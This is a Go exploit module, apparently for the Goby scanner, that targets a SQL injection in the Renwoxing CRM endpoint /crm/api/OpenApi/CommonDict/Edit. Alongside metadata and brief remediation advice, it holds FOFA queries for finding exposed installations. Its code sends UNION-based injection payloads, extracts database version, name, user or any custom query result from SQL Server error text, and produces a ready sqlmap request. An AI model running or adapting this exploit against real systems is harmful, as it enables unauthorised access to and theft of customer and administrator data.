package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Renwoxing Collaborative CRM Popular Edition /crm/api/OpenApi/CommonDict/Edit SQL Injection Vulnerability",
    "Description": "<p>Renwoxing Collaborative CRM Popular Edition is a customer relationship management software developed by Chengdu Renwoxing Information Technology Co., Ltd. The software is designed to help small and medium-sized enterprises simplify management processes, improve customer management capabilities, and optimize sales performance. It integrates multiple functions such as CRM, OA, HR, etc., providing a comprehensive management platform for enterprises. Through highly integrated solutions, the software helps enterprises achieve centralized management of customer information, automated tracking of sales processes, and continuous improvement of service quality. At the same time, it supports a variety of customized needs, and enterprises can make personalized settings according to their own business characteristics to better meet various specific needs.</p>",
    "Product": "Renwu-CRM",
    "Homepage": "https://www.wecrm.com/",
    "DisclosureDate": "2024-11-18",
    "PostTime": "2024-11-18",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"Resources/css/crmbase\" || body=\"CrmMainFrame/LoginNew\" || body=\"/Resources/imgs/defaultannex/loginpictures/\" || title=\"欢迎使用任我行CRM\"",
    "GobyQuery": "body=\"Resources/css/crmbase\" || body=\"CrmMainFrame/LoginNew\" || body=\"/Resources/imgs/defaultannex/loginpictures/\" || title=\"欢迎使用任我行CRM\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.</p>",
    "Recommendation": "<p>1. Follow the manufacturer's official website and keep updated: <a href=\"https://www.wecrm.com/\">www.wecrm.com</a></p><p>2. Deploy a Web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/143858051?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "@@version",
            "show": "attackType=custom"
        },
        {
            "name": "default",
            "type": "select",
            "value": "@@version,DB_NAME(),USER_NAME()",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "任我行协同CRM普及版 /crm/api/OpenApi/CommonDict/Edit SQL 注入漏洞",
            "Product": "任我行-CRM",
            "Description": "<p>任我行协同CRM普及版是由成都市任我行信息技术有限公司开发的一款客户关系管理软件。该软件旨在帮助中小企业简化管理流程，提升客户管理能力，以及优化销售业绩。集成了CRM、OA、HR等多项功能于一体，为企业提供了一个全面的管理平台。该软件通过高度集成的解决方案，帮助企业实现客户信息的集中管理、销售流程的自动化跟踪以及服务质量的持续提升。同时，它支持多种定制化需求，企业可以根据自身的业务特点进行个性化设置，从而更好地满足各种具体需求。<br></p>",
            "Recommendation": "<p>1、关注厂商官网，及时关注更新信息：<a href=\"http://www.wecrm.com\">www.wecrm.com</a><a href=\"https://www.data86.net/category/product\"></a><br></p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;<br></p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Renwoxing Collaborative CRM Popular Edition /crm/api/OpenApi/CommonDict/Edit SQL Injection Vulnerability",
            "Product": "Renwu-CRM",
            "Description": "<p>Renwoxing Collaborative CRM Popular Edition is a customer relationship management software developed by Chengdu Renwoxing Information Technology Co., Ltd. The software is designed to help small and medium-sized enterprises simplify management processes, improve customer management capabilities, and optimize sales performance. It integrates multiple functions such as CRM, OA, HR, etc., providing a comprehensive management platform for enterprises. Through highly integrated solutions, the software helps enterprises achieve centralized management of customer information, automated tracking of sales processes, and continuous improvement of service quality. At the same time, it supports a variety of customized needs, and enterprises can make personalized settings according to their own business characteristics to better meet various specific needs.<br></p>",
            "Recommendation": "<p>1. Follow the manufacturer's official website and keep updated:&nbsp;<a href=\"https://www.wecrm.com/\">www.wecrm.com</a></p><p>2. Deploy a Web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9973"
}`

	setSqlPayloadhrwFVs5Bk4 := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		defineHeader := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}

		postData := fmt.Sprintf("enumType=69&data={\"ID\":\"1\",\"Name\":\"'+UNION+ALL+SELECT+%s--\"}", sql)
		urlGet := "/crm/api/OpenApi/CommonDict/Edit?accesstoken=1&accesskey=1&timestamp=1&nonce=1&signature=1"

		resp, err = setPostRequest(hostInfo, urlGet, postData, defineHeader)
		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil || resp.StatusCode != 200 {
			return resp, "", errors.New("Fail")
		}
		//配置漏洞存在的路径
		vulurl = "/crm/api/OpenApi/CommonDict/Edit"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			MD5Reslut := rand.Intn(99999)
			MD5ResultStr := fmt.Sprintf("%d", MD5Reslut)
			//将MD5Hash进行md5加密
			MD5Hash := md5.New()
			MD5Hash.Write([]byte(MD5ResultStr))
			hashBytes := MD5Hash.Sum(nil)
			// 将MD5哈希值转换为十六进制字符串，并取前16个字符
			content := hex.EncodeToString(hashBytes)[:16]

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := fmt.Sprintf("sys.fn_sqlvarbasetostr(HashBytes('MD5','%s'))", MD5ResultStr)

			//// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `SQL Server`
			//
			//makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			//	reRequest := regexp.MustCompile(RegularUrl)
			//	if !reRequest.MatchString(RegularContent) {
			//		return "", fmt.Errorf("can't match value")
			//	}
			//	getname := reRequest.FindStringSubmatch(RegularContent)
			//	return getname[1], nil
			//}

			sendPayload := setSqlPayloadhrwFVs5Bk4
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /crm/api/OpenApi/CommonDict/Edit?accesstoken=1&accesskey=1&timestamp=1&nonce=1&signature=1 HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Type: application/x-www-form-urlencoded\n\nenumType=69&data={\"ID\":\"1\",\"Name\":\"'*\"}"

			// 3.配置正则语句，从响应包中提取出数据
			regular := `在将 nvarchar 值 '([^'"]+)'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			sendPayload := setSqlPayloadhrwFVs5Bk4
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" {
				sql := goutils.B2S(ss.Params["default"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
